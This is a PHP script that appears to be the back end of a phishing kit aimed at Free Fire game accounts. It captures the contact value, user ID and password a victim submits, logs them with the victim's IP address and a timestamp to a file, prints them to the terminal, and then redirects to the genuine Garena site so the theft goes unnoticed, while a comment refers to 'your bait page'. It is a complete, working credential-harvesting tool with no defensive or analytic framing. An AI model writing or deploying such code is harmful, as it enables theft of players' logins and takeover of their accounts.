<?php
date_default_timezone_set("Asia/Kolkata"); // or change to your timezone

$contact = $_POST['contact'] ?? 'N/A';
$uid = $_POST['uid'] ?? 'N/A';
$pass = $_POST['password'] ?? 'N/A';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date("Y-m-d H:i:s");

$log = "[$timestamp] IP: $ip | Contact: $contact | UID: $uid | Pass: $pass\n";

// Save to logs
file_put_contents("../../logs/freefire.log", $log, FILE_APPEND);

// Print to terminal
echo $log;

// Optional redirect or HTML response
header("Location: https://ff.garena.com"); // or your bait page
exit();
?>
